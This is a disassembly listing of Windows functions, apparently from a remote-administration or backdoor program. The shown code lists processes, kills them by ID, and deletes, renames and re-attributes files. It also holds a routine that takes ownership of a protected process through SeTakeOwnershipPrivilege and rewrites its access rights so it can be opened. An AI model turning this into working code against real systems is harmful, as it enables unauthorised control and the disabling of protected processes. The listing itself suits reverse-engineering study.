sub_4042C0 proc near

TargetHandle= dword ptr -220h
TokenHandle= dword ptr -21Ch
var_218= dword ptr -218h
ReturnLength= dword ptr -214h
PreviousState= _TOKEN_PRIVILEGES ptr -210h
TokenInformation= dword ptr -200h
dwProcessId= dword ptr  4
dwDesiredAccess= dword ptr  8

sub     esp, 220h
mov     eax, [esp+220h+dwDesiredAccess]
push    ebx
push    ebp
push    esi
mov     esi, [esp+22Ch+dwProcessId]
push    edi
mov     edi, ds:OpenProcess
push    esi             ; dwProcessId
push    0               ; bInheritHandle
push    eax             ; dwDesiredAccess
call    edi ; OpenProcess
test    eax, eax
mov     [esp+230h+var_218], eax
jnz     loc_404424
push    esi             ; dwProcessId
push    eax             ; bInheritHandle
push    40000h          ; dwDesiredAccess
call    edi ; OpenProcess
mov     ebx, ds:GetCurrentProcess
mov     ebp, ds:DuplicateHandle
test    eax, eax
mov     [esp+230h+TargetHandle], eax
jnz     loc_4043E9
lea     ecx, [esp+230h+TokenHandle]
push    ecx             ; TokenHandle
push    28h             ; DesiredAccess
call    ebx ; GetCurrentProcess
push    eax             ; ProcessHandle
call    ds:OpenProcessToken
test    eax, eax
jnz     short loc_404330
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 220h
retn

loc_404330:
mov     eax, [esp+230h+TokenHandle]
lea     edx, [esp+230h+PreviousState]
push    edx             ; PreviousState
push    offset aSetakeownershi ; "SeTakeOwnershipPrivilege"
push    eax             ; TokenHandle
call    sub_404230
add     esp, 0Ch
test    eax, eax
jz      loc_4043D6
push    esi             ; dwProcessId
push    0               ; bInheritHandle
push    80000h          ; dwDesiredAccess
call    edi ; OpenProcess
mov     esi, eax
test    esi, esi
jz      short loc_4043C4
mov     eax, [esp+230h+TokenHandle]
lea     ecx, [esp+230h+ReturnLength]
push    ecx             ; ReturnLength
lea     edx, [esp+234h+TokenInformation]
push    200h            ; TokenInformationLength
push    edx             ; TokenInformation
push    1               ; TokenInformationClass
push    eax             ; TokenHandle
mov     [esp+244h+ReturnLength], 200h
call    ds:GetTokenInformation
test    eax, eax
jz      short loc_4043BD
mov     ecx, [esp+230h+TokenInformation]
push    0               ; pSacl
push    0               ; pDacl
push    0               ; psidGroup
push    ecx             ; psidOwner
push    1               ; SecurityInfo
push    6               ; ObjectType
push    esi             ; handle
call    SetSecurityInfo
test    eax, eax
jnz     short loc_4043BD
push    eax             ; dwOptions
push    eax             ; bInheritHandle
lea     edx, [esp+238h+TargetHandle]
push    40000h          ; dwDesiredAccess
push    edx             ; lpTargetHandle
call    ebx ; GetCurrentProcess
push    eax             ; hTargetProcessHandle
push    esi             ; hSourceHandle
call    ebx ; GetCurrentProcess
push    eax             ; hSourceProcessHandle
call    ebp ; DuplicateHandle
test    eax, eax
jnz     short loc_4043BD
mov     [esp+230h+TargetHandle], eax

loc_4043BD:             ; hObject
push    esi
call    ds:CloseHandle

loc_4043C4:
mov     ecx, [esp+230h+TokenHandle]
lea     eax, [esp+230h+PreviousState]
push    eax             ; NewState
push    ecx             ; TokenHandle
call    sub_4042A0
add     esp, 8

loc_4043D6:
mov     edx, [esp+230h+TokenHandle]
push    edx             ; hObject
call    ds:CloseHandle
mov     eax, [esp+230h+TargetHandle]
test    eax, eax
jz      short loc_404424

loc_4043E9:
mov     esi, [esp+230h+dwDesiredAccess]
push    esi             ; NewAcl
push    eax             ; handle
call    sub_404180
add     esp, 8
lea     eax, [esp+230h+var_218]
push    0               ; dwOptions
push    0               ; bInheritHandle
push    esi             ; dwDesiredAccess
push    eax             ; lpTargetHandle
call    ebx ; GetCurrentProcess
mov     ecx, [esp+240h+TargetHandle]
push    eax             ; hTargetProcessHandle
push    ecx             ; hSourceHandle
call    ebx ; GetCurrentProcess
push    eax             ; hSourceProcessHandle
call    ebp ; DuplicateHandle
test    eax, eax
jnz     short loc_404419
mov     [esp+230h+var_218], eax

loc_404419:
mov     edx, [esp+230h+TargetHandle]
push    edx             ; hObject
call    ds:CloseHandle

loc_404424:
mov     eax, [esp+230h+var_218]
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 220h
retn
sub_4042C0 endp

align 10h



; int __cdecl sub_404440(char *Str1)
sub_404440 proc near

Buffer= byte ptr -104h
Str1= dword ptr  4

sub     esp, 104h
push    ebx
mov     ebx, [esp+108h+Str1]
push    ebp
push    esi
test    ebx, ebx
push    edi
jz      loc_404564
cmp     byte ptr [ebx], 0
jz      loc_404564
mov     edi, offset Str ; "\\SystemRoot\\"
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
mov     edi, offset asc_40997C ; "\\??\\"
mov     ebp, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     edi, ds:_strnicmp
push    ebp             ; MaxCount
not     ecx
dec     ecx
push    offset Str      ; "\\SystemRoot\\"
push    ebx             ; Str1
mov     esi, ecx
call    edi ; _strnicmp
add     esp, 0Ch
test    eax, eax
jnz     loc_404536
lea     eax, [esp+114h+Buffer]
push    104h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
test    eax, eax
jz      loc_404564
or      ecx, 0FFFFFFFFh
mov     edi, offset asc_409764 ; "\\"
xor     eax, eax
lea     edx, [esp+114h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+114h+Buffer]
and     ecx, 3
rep movsb
lea     edi, [ebx+ebp]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
lea     edi, [esp+114h+Buffer]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, ebx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 104h
retn

loc_404536:             ; MaxCount
push    esi
push    offset asc_40997C ; "\\??\\"
push    ebx             ; Str1
call    edi ; _strnicmp
add     esp, 0Ch
test    eax, eax
jnz     short loc_404564
lea     edi, [esi+ebx]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, ebx
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb

loc_404564:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 104h
retn
sub_404440 endp

align 10h



sub_404570 proc near

var_2744= dword ptr -2744h
hLibModule= dword ptr -2740h
var_273C= dword ptr -273Ch
var_2738= dword ptr -2738h
var_2734= dword ptr -2734h
pcbBuffer= dword ptr -2730h
var_272C= byte ptr -272Ch
pe= PROCESSENTRY32 ptr -2728h
Str= byte ptr -2600h
Buffer= byte ptr -2400h
Str1= byte ptr -2300h
var_2100= byte ptr -2100h
var_2000= byte ptr -2000h
var_1FFF= dword ptr -1FFFh

mov     eax, 2744h
call    __alloca_probe
mov     eax, VersionInformation.dwPlatformId
push    ebx
push    ebp
push    esi
push    edi
xor     edi, edi
cmp     eax, 2
mov     ebx, 5
mov     [esp+2754h+var_2000], 43h
mov     [esp+2754h+hLibModule], edi
mov     [esp+2754h+var_2738], edi
mov     [esp+2754h+var_273C], edi
jnz     short loc_4045E0
push    offset aPsapiDll ; "psapi.dll"
call    ds:LoadLibraryA
mov     esi, eax
cmp     esi, edi
mov     [esp+2754h+hLibModule], esi
jz      short loc_404617
mov     edi, ds:GetProcAddress
push    offset aEnumprocessmod ; "EnumProcessModules"
push    esi             ; hModule
call    edi ; GetProcAddress
mov     ebp, eax
push    offset aGetmodulefilen_0 ; "GetModuleFileNameExA"
push    esi             ; hModule
mov     [esp+275Ch+var_2738], ebp
call    edi ; GetProcAddress
test    ebp, ebp
mov     [esp+2754h+var_273C], eax
jz      short loc_404617
test    eax, eax
jz      short loc_404617

loc_4045E0:             ; th32ProcessID
push    0
push    2               ; dwFlags
call    CreateToolhelp32Snapshot
mov     ebp, eax
cmp     ebp, 0FFFFFFFFh
mov     [esp+2754h+var_2744], ebp
jz      short loc_40461B
lea     eax, [esp+2754h+pe]
mov     [esp+2754h+pe.dwSize], 128h
push    eax             ; lppe
push    ebp             ; hSnapshot
call    Process32First
test    eax, eax
jnz     short loc_404627
mov     [esp+2754h+var_1FFF], ebx
jmp     loc_40499E

loc_404617:
mov     ebp, [esp+2754h+var_2744]

loc_40461B:
mov     [esp+2754h+var_1FFF], ebx
jmp     loc_40499E

loc_404627:
lea     edi, [esp+2754h+pe.szExeFile]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+2754h+Str]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     ecx, [esp+2754h+pe.th32ProcessID]
push    ecx             ; dwProcessId
push    0               ; bInheritHandle
push    410h            ; dwDesiredAccess
call    ds:OpenProcess
mov     esi, eax
push    esi             ; hProcess
call    ds:GetPriorityClass
push    esi             ; hObject
call    ds:CloseHandle
cmp     VersionInformation.dwPlatformId, 2
jnz     loc_404715
mov     edx, [esp+2754h+pe.th32ProcessID]
push    410h            ; dwDesiredAccess
push    edx             ; dwProcessId
call    sub_4042C0
add     esp, 8
mov     ebp, eax
lea     eax, [esp+2754h+var_272C]
lea     ecx, [esp+2754h+var_2734]
push    eax
push    4
push    ecx
push    ebp
call    [esp+2764h+var_2738]
test    eax, eax
jz      short loc_4046CE
mov     eax, [esp+2754h+var_2734]
lea     edx, [esp+2754h+Str1]
push    200h
push    edx
push    eax
push    ebp
call    [esp+2764h+var_273C]
lea     ecx, [esp+2754h+Str1]
push    ecx             ; Str1
call    sub_404440
add     esp, 4

loc_4046CE:
lea     edx, [esp+2754h+Buffer]
push    edx             ; Name
push    ebp             ; ProcessHandle
call    sub_405FB0
add     esp, 8
test    eax, eax
jnz     short loc_40470A
mov     edi, offset aSystem ; "SYSTEM"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+2754h+Buffer]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_40470A:             ; hObject
push    ebp
call    ds:CloseHandle
mov     ebp, [esp+2754h+var_2744]

loc_404715:
cmp     VersionInformation.dwPlatformId, 1
jnz     loc_4047CA
lea     edi, [esp+2754h+pe.szExeFile]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+2754h+Str1]
repne scasb
not     ecx
sub     edi, ecx
push    5Ch             ; Ch
mov     eax, ecx
mov     esi, edi
mov     edi, edx
mov     [esp+2758h+pcbBuffer], 100h
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+2758h+Str]
push    ecx             ; Str
call    ds:strrchr
add     esp, 8
inc     eax
mov     edi, eax
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+2754h+var_2100]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+2754h+Str]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+2754h+var_2100]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+2754h+Buffer]
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+2754h+pcbBuffer]
push    ecx             ; pcbBuffer
push    edx             ; lpBuffer
call    ds:GetUserNameA

loc_4047CA:
mov     eax, [esp+2754h+pe.th32ProcessID]
test    eax, eax
jnz     short loc_404824
mov     edi, offset unk_4094A8
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+2754h+Str]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+2754h+Str1]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset aOsKernel ; "OS Kernel"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_404824:
lea     ecx, [esp+2754h+Str]
push    offset aSystem_0 ; "System"
push    ecx             ; lpString1
call    ds:lstrcmpiA
test    eax, eax
jnz     short loc_404862
mov     edi, offset aOsKernel ; "OS Kernel"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+2754h+Str1]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_404862:
or      ecx, 0FFFFFFFFh
mov     edi, offset asc_409998 ; "("
xor     eax, eax
lea     edx, [esp+2754h+Str]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+2754h+Str]
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
lea     edi, [esp+2754h+Str1]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+2754h+Str]
and     ecx, 3
rep movsb
mov     edi, offset asc_409994 ; ")"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+ebx+2754h+var_2000]
and     ecx, 3
rep movsb
lea     edi, [esp+2754h+Str]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+2754h+Str]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     edi, [esp+2754h+Buffer]
lea     edx, [ebx+ecx+1]
mov     ecx, [esp+2754h+pe.th32ProcessID]
mov     dword ptr [esp+edx+2754h+var_2000], ecx
add     edx, 4
lea     ebx, [esp+edx+2754h+var_2000]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, ebx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+2754h+Buffer]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     ebx, [edx+ecx+1]
mov     ecx, [esp+2754h+pe.cntThreads]
lea     edx, [esp+2754h+pe]
push    edx             ; lppe
mov     dword ptr [esp+ebx+2758h+var_2000], ecx
push    ebp             ; hSnapshot
add     ebx, 4
call    Process32Next
test    eax, eax
jnz     loc_404627

loc_40499E:
cmp     ebp, 0FFFFFFFFh
jz      short loc_4049AA
push    ebp             ; hObject
call    ds:CloseHandle

loc_4049AA:
mov     eax, [esp+2754h+hLibModule]
test    eax, eax
jz      short loc_4049B9
push    eax             ; hLibModule
call    ds:FreeLibrary

loc_4049B9:
lea     eax, [esp+2754h+var_2000]
push    ebx
push    eax
mov     [esp+275Ch+var_1FFF], ebx
call    sub_402980
add     esp, 8
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 2744h
retn
sub_404570 endp

align 10h



; int __cdecl sub_4049E0(DWORD dwProcessId)
sub_4049E0 proc near

dwProcessId= dword ptr  4

push    esi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
push    offset aTerminateproce ; "TerminateProcess"
push    eax             ; hModule
call    ds:GetProcAddress
mov     esi, eax
mov     eax, [esp+4+dwProcessId]
push    1               ; dwDesiredAccess
push    eax             ; dwProcessId
call    sub_4042C0
add     esp, 8
test    eax, eax
jz      short loc_404A14
push    1
push    eax
call    esi
pop     esi
retn

loc_404A14:
xor     eax, eax
pop     esi
retn
sub_4049E0 endp

align 10h



sub_404A20 proc near
mov     eax, lpPathName
mov     ecx, [eax]
push    ecx             ; dwProcessId
call    sub_4049E0
add     esp, 4
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
jmp     sub_405140
sub_404A20 endp

align 10h



; int __cdecl sub_404A50(DWORD dwProcessId)
sub_404A50 proc near

dwProcessId= dword ptr  4

push    esi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
push    offset aTerminateproce ; "TerminateProcess"
push    eax             ; hModule
call    ds:GetProcAddress
mov     esi, eax
mov     eax, [esp+4+dwProcessId]
push    eax             ; dwProcessId
push    0               ; bInheritHandle
push    1               ; dwDesiredAccess
call    ds:OpenProcess
test    eax, eax
jz      short loc_404A84
push    1
push    eax
call    esi
pop     esi
retn

loc_404A84:
xor     eax, eax
pop     esi
retn
sub_404A50 endp

align 10h



sub_404A90 proc near
mov     eax, lpPathName
mov     ecx, [eax]
push    ecx             ; dwProcessId
call    sub_404A50
add     esp, 4
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
jmp     sub_405140
sub_404A90 endp

align 10h



sub_404AC0 proc near
mov     eax, lpPathName
push    eax             ; Str
call    sub_406B00
add     esp, 4
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
jmp     sub_405140
sub_404AC0 endp




sub_404AE0 proc near

FileName= byte ptr -400h
var_200= byte ptr -200h

sub     esp, 400h
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+400h+var_200]
push    ebx
push    esi
push    edi
mov     edi, lpPathName
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+40Ch+var_200]
or      ecx, 0FFFFFFFFh
repne scasb
mov     eax, dword_40A084
not     ecx
dec     ecx
mov     ebx, ecx
inc     ebx
cmp     ebx, eax
jge     loc_404BE1
push    ebp

loc_404B35:
lea     edi, [esp+410h+var_200]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+410h+FileName]
repne scasb
not     ecx
sub     edi, ecx
lea     ebp, [esp+410h+FileName]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
push    eax             ; dwFileAttributes
rep movsb
mov     ecx, lpPathName
lea     edx, [ecx+ebx]
or      ecx, 0FFFFFFFFh
mov     edi, edx
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, ebp
mov     ebp, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     edx, [esp+414h+FileName]
push    edx             ; lpFileName
lea     ebx, [ebx+ecx+1]
call    ds:SetFileAttributesA
mov     eax, lpPathName
cmp     byte ptr [eax+ebx], 30h
jnz     short loc_404BC3
lea     ecx, [esp+410h+FileName]
push    ecx             ; lpFileName
call    ds:DeleteFileA
jmp     short loc_404BD2

loc_404BC3:
lea     edx, [esp+410h+FileName]
push    4Ch             ; int
push    edx             ; lpPathName
call    sub_405170
add     esp, 8

loc_404BD2:
mov     eax, dword_40A084
inc     ebx
cmp     ebx, eax
jl      loc_404B35
pop     ebp

loc_404BE1:
mov     byte_40AA20, 4Fh
call    sub_405140
pop     edi
pop     esi
pop     ebx
add     esp, 400h
retn
sub_404AE0 endp

align 10h



sub_404C00 proc near
mov     edx, lpPathName
push    edi
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
lea     eax, [ecx+edx+1]
push    eax             ; NewFilename
push    edx             ; OldFilename
call    ds:rename
add     esp, 8
neg     eax
sbb     al, al
and     al, 0F6h
add     al, 4Fh
mov     byte_40AA20, al
call    sub_405140
pop     edi
retn
sub_404C00 endp

align 10h



sub_404C40 proc near

var_2= byte ptr -2
var_1= byte ptr -1

push    ecx
mov     edx, lpPathName
push    ebx
push    edi
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
mov     edi, edx
push    edx             ; lpFileName
mov     bl, [ecx+edx+1]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
mov     edi, edx
mov     al, [ecx+edx+2]
or      ecx, 0FFFFFFFFh
mov     [esp+10h+var_2], al
xor     eax, eax
repne scasb
not     ecx
dec     ecx
mov     cl, [ecx+edx+3]
mov     [esp+10h+var_1], cl
call    ds:GetFileAttributesA
mov     cl, 31h
pop     edi
cmp     bl, cl
pop     ebx
jnz     short loc_404C92
or      al, 1
jmp     short loc_404C94

loc_404C92:
and     al, 0FEh

loc_404C94:
cmp     [esp+4+var_2], cl
jnz     short loc_404C9E
or      al, 2
jmp     short loc_404CA0

loc_404C9E:
and     al, 0FDh

loc_404CA0:
cmp     [esp+4+var_1], cl
jnz     short loc_404CAA
or      al, 4
jmp     short loc_404CAC

loc_404CAA:
and     al, 0FBh

loc_404CAC:
mov     edx, lpPathName
push    eax             ; dwFileAttributes
push    edx             ; lpFileName
call    ds:SetFileAttributesA
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
call    sub_405140
pop     ecx
retn
sub_404C40 endp

align 10h



sub_404CD0 proc near
mov     eax, lpPathName
push    0               ; lpSecurityAttributes
push    eax             ; lpPathName
call    ds:CreateDirectoryA
neg     eax
sbb     al, al
and     al, 0Ah
add     al, 45h
mov     byte_40AA20, al
jmp     sub_405140
sub_404CD0 endp




sub_404CF0 proc near
mov     eax, lpPathName
push    0               ; hTemplateFile
push    2               ; dwFlagsAndAttributes
push    2               ; dwCreationDisposition
push    0               ; lpSecurityAttributes
push    0               ; dwShareMode
push    40000000h       ; dwDesiredAccess
push    eax             ; lpFileName
call    ds:CreateFileA
cmp     eax, 0FFFFFFFFh
jz      short loc_404D20
push    eax             ; hObject
call    ds:CloseHandle
mov     byte_40AA20, 4Fh
jmp     short loc_404D27

loc_404D20:
mov     byte_40AA20, 45h

loc_404D27:
jmp     sub_405140
sub_404CF0 endp

align 10h



sub_404D30 proc near

var_210= dword ptr -210h
var_20C= byte ptr -20Ch
var_208= byte ptr -208h
var_207= dword ptr -207h
Str= byte ptr -200h

mov     ecx, dword_40A084
mov     eax, lpPathName
sub     esp, 210h
mov     edx, ecx
shr     ecx, 2
push    ebx
push    ebp
push    esi
push    edi
mov     esi, eax
lea     edi, [esp+220h+Str]
rep movsd
mov     ecx, edx
push    5Ch             ; Ch
and     ecx, 3
push    eax             ; Str
rep movsb
mov     esi, ds:strrchr
call    esi ; strrchr
push    eax
call    sub_405000
lea     eax, [esp+22Ch+Str]
push    5Ch             ; Ch
push    eax             ; Str
call    esi ; strrchr
add     esp, 14h
test    eax, eax
jz      short loc_404D7E
mov     byte ptr [eax+1], 0

loc_404D7E:
mov     edi, offset asc_4099D0 ; "*.*"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+220h+Str]
repne scasb
not     ecx
sub     edi, ecx
push    7D00h           ; Size
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
mov     [esp+224h+var_208], 42h
and     ecx, 3
rep movsb
call    ds:malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jz      loc_404EF2
lea     eax, [esp+220h+Str]
push    eax             ; lpFileName
call    sub_404F80
mov     esi, eax
add     esp, 4
cmp     esi, 0FFFFFFFFh
jz      loc_404EE8
test    esi, esi
jnz     short loc_404DEA
mov     esi, 1

loc_404DEA:
lea     ecx, [esi+esi*4]
lea     edx, [esp+220h+var_208]
shl     ecx, 6
add     ecx, 5
push    5
push    edx
mov     [esp+228h+var_207], ecx
call    sub_402980
add     esp, 8
lea     eax, [esp+220h+Str]
push    ebx             ; lpFindFileData
push    eax             ; lpFileName
call    ds:FindFirstFileA
mov     edi, eax
cmp     edi, 0FFFFFFFFh
jnz     short loc_404E6E
or      ecx, eax
mov     edi, offset asc_4099CC ; "."
xor     eax, eax
lea     edx, [ebx+2Ch]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+220h+var_210]
push    ecx
push    ebx
push    140h
push    ebx
call    sub_4037B0
push    140h
push    ebx
call    sub_4028D0
push    ebx             ; Memory
call    ds:free
add     esp, 1Ch
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 210h
retn

loc_404E6E:
push    ebx
call    sub_405060
add     esp, 4
test    eax, eax
jz      short loc_404E9E
lea     edx, [esp+220h+var_20C]
push    edx
push    ebx
push    140h
push    ebx
call    sub_4037B0
push    140h
push    ebx
call    sub_4028D0
add     esp, 18h
test    eax, eax
jz      short loc_404EE8

loc_404E9E:
xor     ebp, ebp
dec     esi
test    esi, esi
mov     [esp+220h+var_210], esi
jle     short loc_404EE1

loc_404EA9:             ; lpFindFileData
push    ebx
push    edi             ; hFindFile
call    sub_404F20
add     esp, 8
cmp     eax, 0FFFFFFFFh
jz      short loc_404EFD
add     ebp, eax
lea     esi, [eax+eax*4]
lea     eax, [esp+220h+var_20C]
shl     esi, 6
push    eax
push    ebx
push    esi
push    ebx
call    sub_4037B0
push    esi
push    ebx
call    sub_4028D0
add     esp, 18h
test    eax, eax
jz      short loc_404EFD
cmp     ebp, [esp+220h+var_210]
jl      short loc_404EA9

loc_404EE1:             ; hFindFile
push    edi
call    ds:FindClose

loc_404EE8:             ; Memory
push    ebx
call    ds:free
add     esp, 4

loc_404EF2:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 210h
retn

loc_404EFD:             ; Memory
push    ebx
call    ds:free
add     esp, 4
push    edi             ; hFindFile
call    ds:FindClose
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 210h
retn
sub_404D30 endp

align 10h



; int __cdecl sub_404F20(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
sub_404F20 proc near

hFindFile= dword ptr  4
lpFindFileData= dword ptr  8

push    ebx
mov     ebx, [esp+4+hFindFile]
push    ebp
mov     ebp, ds:FindNextFileA
push    esi
mov     esi, [esp+0Ch+lpFindFileData]
push    edi
push    esi             ; lpFindFileData
push    ebx             ; hFindFile
xor     edi, edi
call    ebp ; FindNextFileA
test    eax, eax
jz      short loc_404F66

loc_404F3C:
mov     eax, dword_40A074
test    eax, eax
jnz     short loc_404F6D
push    esi
call    sub_405060
add     esp, 4
test    eax, eax
jz      short loc_404F59
inc     edi
add     esi, 140h

loc_404F59:
cmp     edi, 64h
jge     short loc_404F66
push    esi             ; lpFindFileData
push    ebx             ; hFindFile
call    ebp ; FindNextFileA
test    eax, eax
jnz     short loc_404F3C

loc_404F66:
mov     eax, edi
pop     edi
pop     esi
pop     ebp
pop     ebx
retn

loc_404F6D:
pop     edi
pop     esi
pop     ebp
or      eax, 0FFFFFFFFh
pop     ebx
retn
sub_404F20 endp

align 10h



; int __cdecl sub_404F80(LPCSTR lpFileName)
sub_404F80 proc near

FindFileData= _WIN32_FIND_DATAA ptr -140h
lpFileName= dword ptr  4

mov     ecx, [esp+lpFileName]
sub     esp, 140h
lea     eax, [esp+140h+FindFileData]
push    ebx
push    esi
push    edi
push    eax             ; lpFindFileData
push    ecx             ; lpFileName
xor     edi, edi
call    ds:FindFirstFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jz      short loc_404FEC
mov     ebx, ds:FindNextFileA

loc_404FA8:
lea     edx, [esp+14Ch+FindFileData]
push    edx
call    sub_405060
add     esp, 4
test    eax, eax
jz      short loc_404FBA
inc     edi

loc_404FBA:
mov     eax, dword_40A074
test    eax, eax
jnz     short loc_404FD1
lea     eax, [esp+14Ch+FindFileData]
push    eax             ; lpFindFileData
push    esi             ; hFindFile
call    ebx ; FindNextFileA
test    eax, eax
jz      short loc_404FE5
jmp     short loc_404FA8

loc_404FD1:             ; hFindFile
push    esi
call    ds:FindClose
pop     edi
pop     esi
or      eax, 0FFFFFFFFh
pop     ebx
add     esp, 140h
retn

loc_404FE5:             ; hFindFile
push    esi
call    ds:FindClose

loc_404FEC:
mov     eax, edi
pop     edi
pop     esi
pop     ebx
add     esp, 140h
retn
sub_404F80 endp

align 10h



sub_405000 proc near

arg_0= dword ptr  4

mov     edx, [esp+arg_0]
mov     dword_40A9B8, 0
test    edx, edx
jz      short locret_405059
push    ebx
mov     ebx, ds:strchr
push    esi
push    edi

loc_40501B:
lea     esi, [edx+1]
push    3Bh             ; Val
